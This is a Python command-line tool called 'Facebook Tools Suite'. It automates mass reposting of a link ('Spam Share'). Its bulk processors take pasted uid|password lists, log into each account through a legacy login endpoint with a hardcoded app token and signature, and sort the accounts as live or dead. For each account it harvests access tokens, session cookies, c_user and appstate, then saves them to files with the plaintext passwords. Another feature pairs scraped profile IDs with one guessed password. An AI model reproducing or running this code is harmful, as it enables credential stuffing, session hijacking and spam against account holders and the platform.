import requests
import time
import os
import json
import re
from colorama import Fore, Style, init
from rich.panel import Panel
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as bs

# Initialize colorama
init()
console = Console()

# Color definitions
PURPLE = '\033[95m'
GREEN = '\033[92m'
RED = '\033[1;91m'
YELLOW = '\033[1;93m'
BLUE = '\033[1;94m'
CYAN = '\033[1;96m'
PINK = '\033[1;95m'
BRIGHT_RED = '\033[31;1m'
BRIGHT_BLUE = '\033[94;1m'
RESET = '\033[0m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner(title):
    console.print(Panel(
        f"""
[cyan]     __  __  _   _ ___
__  ___ 
[cyan]    / ___||  _ \| | | | ____|  _ \| ____|
[cyan]    \___ \| |_) | |_| |  | | |) |  _|  
[cyan]     _) |  _/|  _  | |___|  _ <| |__ 
[cyan]    |____/|_|   |_| |_|_____|_| \_\_____|
        """,
        title=f"[green]●[yellow] {title} [/]",
        width=65,
        style="bold bright_white",
    ))

def load_cookie():
    """Load Facebook cookie for UID extraction - User must provide their own cookie"""
    console.print("[yellow]Note: This feature requires a Facebook session cookie.[/yellow]")
    console.print("[cyan]You can get your cookie from your browser's developer tools.[/cyan]\n")
    
    cookie_input = input("Enter your Facebook cookie (or press Enter to skip): ").strip()
    
    if cookie_input:
        # Return cookie as a string to be used in Cookie header
        return cookie_input
    else:
        return None

def main_menu():
    while True:
        clear_screen()
        display_banner("FACEBOOK TOOLS SUITE")
        console.print(Panel(
            """
[green]1. Spam Share           [green]5. Get AppState
[green]2. Token Getter         [green]6. Get C_USER
[green]3. Link to UID|Pass     [green]7. Get All Data
[green]4. Get Cookie           [red]8. Exit
            """,
            width=65,
            style="bold bright_white",
        ))
        choice = input("Select an option: ")
        
        if choice == "1":
            spam_share()
        elif choice == "2":
            token_getter()
        elif choice == "3":
            link_to_uid_converter()
        elif choice == "4":
            bulk_processor('cookie')
        elif choice == "5":
            bulk_processor('appstate')
        elif choice == "6":
            bulk_processor('c_user')
        elif choice == "7":
            bulk_processor('all')
        elif choice == "8":
            console.print("[red]Exiting...")
            break
        else:
            console.print("[red]Invalid choice! Try again.")
            time.sleep(2)

# ============================================================================
# SPAM SHARE FEATURE
# ============================================================================

class FacebookPoster:
    """Facebook post sharing class using Graph API - repost with original content"""
    def __init__(self, link, access_token):
        self.link = link
        self.access_token = access_token
    
    def extract_post_id(self, link):
        """Extract post ID from Facebook URL"""
        # Try to extract post ID from various Facebook URL formats
        patterns = [
            r'(\d+_\d+)',  # Standard format: userid_postid
            r'story_fbid=(\d+)&id=(\d+)',  # Permalink format
            r'fbid=(\d+)',
            r'posts/(\d+)',
            r'videos/(\d+)',
        ]
        
        # Try standard format first (userid_postid)
        match = re.search(r'(\d+_\d+)', link)
        if match:
            return match.group(1)
        
        # Try story_fbid format and construct post ID
        match = re.search(r'story_fbid=(\d+)&id=(\d+)', link)
        if match:
            return f"{match.group(2)}_{match.group(1)}"
        
        # Try other patterns
        for pattern in patterns[2:]:
            match = re.search(pattern, link)
            if match:
                return match.group(1)
        
        return None

    def get_post_details(self, post_id):
        """Fetch original post details"""
        try:
            url = f"https://graph.facebook.com/v18.0/{post_id}"
            params = {
                'fields': 'message,full_picture,link,name,description',
                'access_token': self.access_token
            }
            response = requests.get(url, params=params, timeout=30)
            if response.status_code == 200:
                return response.json()
            return None
        except:
            return None

    def share_post(self):
        """Shares a post by posting the link with Facebook's auto-generated preview"""
        url = "https://graph.facebook.com/v18.0/me/feed"
        
        # Post the link - Facebook will automatically generate a preview card
        post_data = {
            'link': self.link,
            'access_token': self.access_token,
            'privacy': json.dumps({'value': 'EVERYONE'})
        }
        
        headers = {
            'accept': '*/*',
            'user-agent': 'Mozilla/5.0',
        }
        
        try:
            response = requests.post(url, data=post_data, headers=headers, timeout=30)
            response_data = response.json()
            
            if response.status_code == 200 and 'id' in response_data:
                return {'success': True, 'data': response_data}
            else:
                error_msg = response_data.get('error', {}).get('message', f'HTTP {response.status_code}')
                return {'success': False, 'error': error_msg}
        except requests.exceptions.RequestException as e:
            return {'success': False, 'error': str(e)}

def share_with_threading(link, access_token, num_shares, max_workers=10):
    """Share posts using multi-threading for better performance"""
    start_time = time.time()
    successful_shares = 0
    failed_shares = 0
    
    console.print(f"\n[yellow]Starting share operation...[/yellow]")
    console.print(f"[cyan]Target shares: {num_shares}[/cyan]")
    console.print(f"[cyan]Max workers: {max_workers}[/cyan]\n")
    
    def worker(share_num):
        nonlocal successful_shares, failed_shares
        fb_poster = FacebookPoster(link, access_token)
        result = fb_poster.share_post()
        
        if result['success']:
            successful_shares += 1
            post_id = result['data'].get('id', 'Unknown')
            console.print(f"[green]✓ Share {share_num}/{num_shares} - SUCCESS (ID: {post_id})[/green]")
        else:
            failed_shares += 1
            # Only show first error in detail, rest just count
            if failed_shares == 1:
                console.print(f"[red]✗ Share {share_num}/{num_shares} - FAILED: {result['error']}[/red]")
            elif failed_shares % 10 == 0:
                console.print(f"[red]✗ Failed {failed_shares} shares total (Error: {result['error']})[/red]")
        
        return result['success']
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(worker, i+1) for i in range(num_shares)]
        for future in futures:
            future.result()
    
    duration = time.time() - start_time
    console.print(f"\n[bold cyan]{'='*65}[/bold cyan]")
    console.print(f"[bold green]Share Operation Complete![/bold green]")
    console.print(f"[cyan]Total shares attempted: {num_shares}[/cyan]")
    console.print(f"[green]Successful: {successful_shares}[/green]")
    console.print(f"[red]Failed: {failed_shares}[/red]")
    console.print(f"[yellow]Duration: {duration:.2f} seconds[/yellow]")
    console.print(f"[bold cyan]{'='*65}[/bold cyan]\n")

def spam_share():
    clear_screen()
    display_banner("SPAM SHARE")
    console.print("[cyan]Enter your access token and post details:[/cyan]\n")
    
    access_token = input("Access Token: ")
    share_url = input("Post Link/ID: ")
    
    # Convert to full URL if only ID provided
    if 'facebook.com' not in share_url:
        share_url = f"https://www.facebook.com/{share_url}"
    
    try:
        share_count = int(input("Share Count: "))
    except ValueError:
        console.print("[red]Error: Please enter a valid number![/red]")
        time.sleep(2)
        return
    
    # Ask for threading preference
    use_threading = input("Use multi-threading for faster sharing? (y/n, default=y): ").strip().lower()
    
    if use_threading != 'n':
        try:
            max_workers = int(input("Max concurrent workers (1-50, default=10): ") or "10")
            max_workers = min(max(1, max_workers), 50)  # Clamp between 1 and 50
        except ValueError:
            max_workers = 10
        
        share_with_threading(share_url, access_token, share_count, max_workers)
    else:
        # Single-threaded sharing
        console.print(f"\n[yellow]Starting single-threaded share operation...[/yellow]\n")
        fb_poster = FacebookPoster(share_url, access_token)
        successful = 0
        failed = 0
        
        for i in range(share_count):
            result = fb_poster.share_post()
            if result['success']:
                successful += 1
                console.print(f"[green]✓ Share {i+1}/{share_count} - SUCCESS[/green]")
            else:
                failed += 1
                console.print(f"[red]✗ Share {i+1}/{share_count} - FAILED: {result['error']}[/red]")
            time.sleep(0.5)  # Small delay between shares
        
        console.print(f"\n[bold cyan]{'='*65}[/bold cyan]")
        console.print(f"[bold green]Operation Complete![/bold green]")
        console.print(f"[green]Successful: {successful}[/green]")
        console.print(f"[red]Failed: {failed}[/red]")
        console.print(f"[bold cyan]{'='*65}[/bold cyan]\n")
    
    input("[bold yellow]Press Enter to return to the main menu...[/bold yellow]")

# ============================================================================
# TOKEN GETTER FEATURE (Single Account)
# ============================================================================

def token_getter():
    clear_screen()
    display_banner("TOKEN GETTER")
    console.print("[cyan]Format: email|password or phone|password or uid|password[/cyan]\n")
    
    uid = input("Enter your email/phone/uid: ")
    password = input("Enter your password: ")
    
    console.print("\n[yellow]Processing...[/yellow]")
    result = get_facebook_token(uid, password)
    
    if result['success']:
        console.print(f"\n[bold green]✓ SUCCESS[/bold green]")
        console.print(f"\n[bold cyan]Token (uid|token format):[/bold cyan]")
        console.print(f"[bold green]{uid}|{result['token']}[/bold green]")
        console.print(f"\n[bold cyan]Access Token:[/bold cyan]")
        console.print(f"[green]{result['token']}[/green]")
        console.print(f"\n[bold cyan]Cookie:[/bold cyan]")
        console.print(f"[green]{result['cookie']}[/green]")
        if result['c_user']:
            console.print(f"\n[bold cyan]C_USER:[/bold cyan] [green]{result['c_user']}[/green]")
        if result['datr']:
            console.print(f"[bold cyan]DATR:[/bold cyan] [green]{result['datr']}[/green]")
    else:
        console.print(f"\n[bold red]✗ FAILED[/bold red]")
        console.print(f"[red]Error: {result['error']}[/red]")
    
    input("\n[bold yellow]Press Enter to return to the main menu...[/bold yellow]")

# ============================================================================
# LINK TO UID|PASSWORD CONVERTER
# ============================================================================

def get_uid_from_link(fbd, cookie):
    """Extract UID from Facebook profile link"""
    try:
        if not cookie:
            return None, 'Cookie not loaded'
        
        session = requests.Session()
        
        if 'profile.php?id=' in str(fbd):
            uid = str(fbd).split('profile.php?id=')[1].split('&')[0]
            fbid = 'https://mbasic.facebook.com/profile.php?id=' + uid
        else:
            fbid = fbd
            if 'www.facebook' in str(fbd):
                fbid = str(fbd).replace('www.facebook', 'mbasic.facebook')
            elif 'm.facebook' in str(fbd):
                fbid = str(fbd).replace('m.facebook', 'mbasic.facebook')
            elif 'facebook.com' in str(fbd) and 'mbasic' not in str(fbd):
                fbid = str(fbd).replace('facebook.com', 'mbasic.facebook.com')
            uid = None
        
        # Use cookie in header instead of cookies parameter
        headers = {
            'Cookie': cookie,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        req2 = bs(session.get(fbid, headers=headers).text, 'html.parser')
        title_text = str(req2.title.string if req2.title else 'Unknown')
        name = title_text
        
        if not uid:
            for link in req2.find_all('a', href=True):
                if 'privacy/touch/block/confirm/?' in str(link):
                    href = link.get('href')
                    if href:
                        uid = str(href.split('&')[0]).split('=')[1]
                        break
        
        if uid:
            return uid, name
        else:
            return None, 'UID not found'
    except requests.exceptions.ConnectionError:
        return None, 'Network Error'
    except Exception as e:
        return None, f'Error: {str(e)}'

def link_to_uid_converter():
    """Convert Facebook links to uid|password format"""
    clear_screen()
    display_banner("LINK TO UID|PASSWORD CONVERTER")
    
    cookie = load_cookie()
    if not cookie:
        console.print("[red]Error: Could not load Facebook cookie. This feature requires internet connection.[/red]")
        input("\n[bold yellow]Press Enter to return to the main menu...[/bold yellow]")
        return
    
    console.print("[cyan]Enter password for all accounts:[/cyan]")
    password = input("Password: ")
    
    if password.strip() == '':
        console.print("[red]Error: Password cannot be empty![/red]")
        input("\n[bold yellow]Press Enter to return to the main menu...[/bold yellow]")
        return
    
    console.print("\n[cyan]Enter Facebook profile links (blank line to finish):[/cyan]")
    
    links = []
    while True:
        link = input()
        if link.strip() == '':
            break
        links.append(link.strip())
    
    if not links:
        console.print("[red]No links entered![/red]")
        input("\n[bold yellow]Press Enter to return to the main menu...[/bold yellow]")
        return
    
    console.print(f"\n[yellow]Processing {len(links)} link(s)...[/yellow]\n")
    results = []
    
    for i, fbd in enumerate(links, 1):
        uid, name = get_uid_from_link(fbd, cookie)
        if uid:
            result = str(uid) + '|' + password
            results.append(result)
            console.print(f"[green][{i}] ✔ {result}[/green]")
        else:
            console.print(f"[red][{i}] ✗ {name}[/red]")
    
    if results:
        console.print(f"\n[cyan]═══ COPY BELOW ═══[/cyan]")
        for result in results:
            print(result)
        console.print(f"[cyan]═══ TOTAL: {len(results)} ═══[/cyan]\n")
        
        save_choice = input("[green]Save to file? (y/n): [/green]").lower()
        if save_choice == 'y':
            filename = input("[green]Filename (results.txt): [/green]") or 'results.txt'
            try:
                with open(filename, 'w') as f:
                    f.write('\n'.join(results))
                console.print(f"[green]✓ Saved to {filename}[/green]")
            except Exception as e:
                console.print(f"[red]Error saving file: {str(e)}[/red]")
    else:
        console.print("[red]All conversions failed![/red]")
    
    input("\n[bold yellow]Press Enter to return to the main menu...[/bold yellow]")

# ============================================================================
# BULK PROCESSORS (Cookie, AppState, C_USER, All Data)
# ============================================================================

def verify_token(access_token, retries=2):
    """Verify if an access token is valid/live with retry logic"""
    for attempt in range(retries):
        try:
            url = "https://graph.facebook.com/v18.0/me"
            params = {
                'access_token': access_token,
                'fields': 'id,name'
            }
            response = requests.get(url, params=params, timeout=15)
            data = response.json()
            
            if 'id' in data:
                return {
                    'live': True,
                    'name': data.get('name', 'Unknown'),
                    'user_id': data.get('id', 'Unknown')
                }
            elif 'error' in data:
                # Token is genuinely invalid
                error_msg = data.get('error', {}).get('message', 'Invalid token')
                return {'live': False, 'is_dead': True, 'error': error_msg}
            else:
                return {'live': False, 'is_dead': True, 'error': 'Unknown error'}
        except requests.exceptions.RequestException as e:
            # Network/timeout error - retry if we have attempts left
            if attempt < retries - 1:
                time.sleep(1)
                continue
            return {'live': False, 'is_dead': False, 'error': f'Network error: {str(e)}'}
        except Exception as e:
            return {'live': False, 'is_dead': False, 'error': f'Verification error: {str(e)}'}
    
    return {'live': False, 'is_dead': False, 'error': 'Verification failed after retries'}

def get_facebook_token(email, password):
    """Get Facebook access token and related data for a single account"""
    session = requests.Session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    payload = {
        'email': email,
        'password': password,
        'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'generate_session_cookies': '1',
        'locale': 'en_US',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'
    }
    
    try:
        response = session.post(
            "https://b-api.facebook.com/method/auth.login",
            headers=headers,
            data=payload,
            timeout=30
        )
        data = response.json()
        
        if 'access_token' in data:
            token = data['access_token']
            cookies = data.get('session_cookies', [])
            cookie_str = '; '.join([f"{c['name']}={c['value']}" for c in cookies])
            
            c_user = next((c['value'] for c in cookies if c['name'] == 'c_user'), None)
            datr = next((c['value'] for c in cookies if c['name'] == 'datr'), None)
            
            appstate = [
                {
                    "key": c['name'],
                    "value": c['value'],
                    "domain": ".facebook.com",
                    "path": "/",
                    "secure": False,
                    "httpOnly": False
                } for c in cookies
            ]
            
            # Verify token is live
            verification = verify_token(token)
            
            return {
                'success': True,
                'token': token,
                'cookie': cookie_str,
                'c_user': c_user,
                'datr': datr,
                'appstate': appstate,
                'live': verification['live'],
                'is_dead': verification.get('is_dead', False),
                'user_name': verification.get('name') if verification['live'] else None,
                'user_id': verification.get('user_id') if verification['live'] else None
            }
        else:
            error_msg = data.get('error_msg', 'Login failed. Unknown error.')
            return {'success': False, 'error': error_msg}
            
    except Exception as e:
        return {'success': False, 'error': str(e)}

def bulk_processor(mode):
    """Process multiple accounts and extract specified data"""
    mode_titles = {
        'cookie': 'Cookie',
        'appstate': 'AppState',
        'c_user': 'C_USER',
        'all': 'All Data'
    }
    
    clear_screen()
    display_banner(f"GET {mode_titles[mode].upper()}")
    console.print("[cyan]Paste uid|password (one per line, blank line to finish):[/cyan]\n")
    
    accounts = []
    lines = []
    
    while True:
        line = input()
        if line.strip() == '':
            break
        lines.append(line)
    
    # Parse accounts
    for line in lines:
        line = line.strip()
        if not line or '|' not in line:
            continue
        parts = line.split('|', 1)
        if len(parts) == 2 and parts[0].strip() and parts[1].strip():
            accounts.append((parts[0].strip(), parts[1].strip()))
    
    if not accounts:
        console.print("[red]No valid accounts entered![/red]")
        input("\n[bold yellow]Press Enter to return to the main menu...[/bold yellow]")
        return
    
    console.print(f"\n[yellow]Processing {len(accounts)} account(s)...[/yellow]\n")
    successful = 0
    failed = 0
    live_accounts = 0
    dead_accounts = 0
    verification_errors = 0
    results = []
    
    for i, (uid, password) in enumerate(accounts, 1):
        print(f"[{i}/{len(accounts)}] {uid}...", end=' ')
        result = get_facebook_token(uid, password)
        
        if result['success']:
            if result.get('live', False):
                print(f"{GREEN}✓ LIVE ({result.get('user_name', 'Unknown')}){RESET}")
                live_accounts += 1
            elif result.get('is_dead', False):
                print(f"{YELLOW}✓ DEAD (Token invalid){RESET}")
                dead_accounts += 1
            else:
                print(f"{CYAN}✓ UNKNOWN (Verification error){RESET}")
                verification_errors += 1
            
            successful += 1
            results.append({
                'uid': uid,
                'password': password,
                'status': 'success',
                'live': result.get('live', False),
                'is_dead': result.get('is_dead', False),
                'user_name': result.get('user_name'),
                'user_id': result.get('user_id'),
                'token': result['token'],
                'cookie': result['cookie'],
                'c_user': result['c_user'],
                'datr': result['datr'],
                'appstate': result['appstate']
            })
        else:
            print(f"{RED}✗ {result['error']}{RESET}")
            failed += 1
    
    console.print(f"\n[bold cyan]{'='*65}[/bold cyan]")
    console.print(f"[cyan]Total Processed: {len(accounts)}[/cyan]")
    console.print(f"[green]✓ Live Accounts: {live_accounts}[/green]")
    console.print(f"[yellow]⚠ Dead Accounts: {dead_accounts}[/yellow]")
    if verification_errors > 0:
        console.print(f"[cyan]? Verification Errors: {verification_errors}[/cyan]")
    console.print(f"[red]✗ Login Failed: {failed}[/red]")
    console.print(f"[bold cyan]{'='*65}[/bold cyan]\n")
    
    if successful > 0:
        # Ask if user wants to see only live accounts
        filter_choice = input("[cyan]Show only LIVE accounts? (y/n, default=n): [/cyan]").lower()
        
        if filter_choice == 'y':
            filtered_results = [r for r in results if r.get('live', False)]
            console.print(f"[green]Filtered to {len(filtered_results)} live accounts[/green]\n")
            display_bulk_results(filtered_results, mode)
            
            save_choice = input("\n[green]Save LIVE accounts to file? (y/n): [/green]").lower()
            if save_choice == 'y':
                save_bulk_results(filtered_results, mode, live_only=True)
        else:
            display_bulk_results(results, mode)
            
            save_choice = input("\n[green]Save ALL accounts to file? (y/n): [/green]").lower()
            if save_choice == 'y':
                save_bulk_results(results, mode, live_only=False)
    
    input("\n[bold yellow]Press Enter to return to the main menu...[/bold yellow]")

def display_bulk_results(results, mode):
    """Display results based on mode"""
    console.print(f"\n[cyan]═══ COPY BELOW ═══[/cyan]")
    
    for result in results:
        if result['status'] == 'success':
            # Build status indicator
            if result.get('live', False):
                user_name = result.get('user_name', 'Unknown')
                status_indicator = f"[LIVE - {user_name}]"
            elif result.get('is_dead', False):
                status_indicator = "[DEAD]"
            else:
                status_indicator = "[VERIFICATION FAILED]"
            
            if mode == 'cookie':
                print(f"{result['cookie']}")
                print(f"# {status_indicator}")
            elif mode == 'c_user':
                print(f"{result['uid']}|{result['c_user']}")
                print(f"# {status_indicator}")
            elif mode == 'appstate':
                print(f"{json.dumps(result['appstate'])}")
                print(f"# {status_indicator}")
            elif mode == 'all':
                print(f"\n{'='*80}")
                print(f"Status: {status_indicator}")
                print(f"UID|Password: {result['uid']}|{result.get('password', 'N/A')}")
                if result.get('user_name'):
                    print(f"User Name: {result['user_name']}")
                if result.get('user_id'):
                    print(f"User ID: {result['user_id']}")
                print(f"Token: {result['token']}")
                print(f"Cookie: {result['cookie']}")
                print(f"C_USER: {result['c_user']}")
                print(f"AppState: {json.dumps(result['appstate'])}")
                print(f"{'='*80}")
    
    console.print(f"[cyan]═══════════════[/cyan]")

def save_bulk_results(results, mode, live_only=False):
    """Save bulk processing results to file"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    suffix = "_LIVE" if live_only else "_ALL"
    filename = f"{mode}{suffix}_{timestamp}.txt"
    
    # Count each category properly
    live_count = sum(1 for r in results if r.get('live', False))
    dead_count = sum(1 for r in results if r.get('is_dead', False))
    verification_errors = sum(1 for r in results if not r.get('live', False) and not r.get('is_dead', False))
    
    try:
        with open(filename, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write(f"FACEBOOK {mode.upper()} Generator Results\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Filter: {'LIVE ACCOUNTS ONLY' if live_only else 'ALL ACCOUNTS'}\n")
            f.write(f"Total: {len(results)} | Live: {live_count} | Dead: {dead_count}")
            if verification_errors > 0:
                f.write(f" | Verification Errors: {verification_errors}")
            f.write("\n")
            f.write("=" * 80 + "\n\n")
            
            for result in results:
                if result['status'] == 'success':
                    # Determine status based on live/is_dead flags
                    if result.get('live', False):
                        status = "LIVE"
                    elif result.get('is_dead', False):
                        status = "DEAD"
                    else:
                        status = "VERIFICATION FAILED"
                    
                    f.write(f"\n{'='*80}\n")
                    f.write(f"Status: {status}\n")
                    f.write(f"UID|Password: {result['uid']}|{result.get('password', 'N/A')}\n")
                    if result.get('user_name'):
                        f.write(f"User Name: {result['user_name']}\n")
                    if result.get('user_id'):
                        f.write(f"User ID: {result['user_id']}\n")
                    f.write("\n")
                    
                    if mode in ['cookie', 'all']:
                        f.write(f"Cookie:\n{result['cookie']}\n\n")
                    if mode in ['c_user', 'all']:
                        f.write(f"C_USER: {result['c_user']}\n")
                        f.write(f"DATR: {result['datr']}\n\n")
                    if mode in ['appstate', 'all']:
                        f.write(f"AppState:\n{json.dumps(result['appstate'], indent=2)}\n\n")
                    if mode == 'all':
                        f.write(f"Access Token:\n{result['token']}\n\n")
                    
                    f.write(f"{'='*80}\n")
        
        console.print(f"[green]✓ Results saved to {filename}[/green]")
    except Exception as e:
        console.print(f"[red]Error saving file: {str(e)}[/red]")

if __name__ == '__main__':
    main_menu()
